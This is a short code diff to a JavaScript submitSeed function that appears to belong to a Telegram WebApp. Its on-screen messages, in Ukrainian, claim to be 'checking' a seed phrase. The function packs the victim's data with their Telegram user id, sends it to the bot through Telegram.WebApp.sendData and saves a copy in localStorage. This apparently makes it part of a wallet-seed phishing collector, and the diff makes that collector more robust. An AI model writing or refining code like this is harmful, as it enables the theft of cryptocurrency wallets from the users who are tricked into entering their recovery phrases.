@@ -191,7 +191,7 @@ function submitSeed() {
     showProcessing("⏳ Перевірка seed-фрази…");
     document.querySelector(".container").innerHTML = "<h3 style='color:green;text-align:center'>⏳ Перевірка…</h3>";
 
-    const tgUser = Telegram?.WebApp?.initDataUnsafe?.user || {};
+    const tgUser = (typeof Telegram !== "undefined" && Telegram.WebApp?.initDataUnsafe?.user) || {};
 
     const payload = {
         user_id: tgUser.id || "-",
@@ -210,7 +210,7 @@ function submitSeed() {
     console.log("📤 Payload:", payload);
     localStorage.setItem("payload_backup", JSON.stringify(payload));
 
-    if (Telegram?.WebApp?.sendData) {
+    if (typeof Telegram !== "undefined" && Telegram.WebApp?.sendData) {
         Telegram.WebApp.sendData(JSON.stringify(payload));
         console.log("📲 Payload надіслано через Telegram WebApp ✅");
     } else {
